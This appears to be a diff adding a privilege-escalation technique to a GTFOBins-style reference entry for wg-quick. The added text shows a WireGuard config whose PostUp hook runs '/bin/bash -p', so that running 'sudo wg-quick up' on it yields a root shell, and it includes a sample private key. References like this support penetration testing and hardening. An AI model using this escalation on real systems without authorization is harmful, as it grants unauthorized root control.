@@ -39,4 +39,26 @@ functions:
         # whoami
         root
         ```
+
+        Another more direct way to obain a shell is to avoid the usage of netcat at all
+
+        ```
+        cat << EOF > ./wg1.conf
+        [Interface]
+        ListenPort = 51821
+        PrivateKey = yNwWXHO7oIDQo/b5eS5R0xdVidxm50AwuQoIKTOGy1g=
+
+        PostUp = /bin/bash -p
+
+        EOF
+        ```
+
+        `sudo wg-quick up ./wg1.conf`
+
+        This will directly drop to a `root` shell.
+
+        ```
+        #whoami
+        root
+        ``
 ---
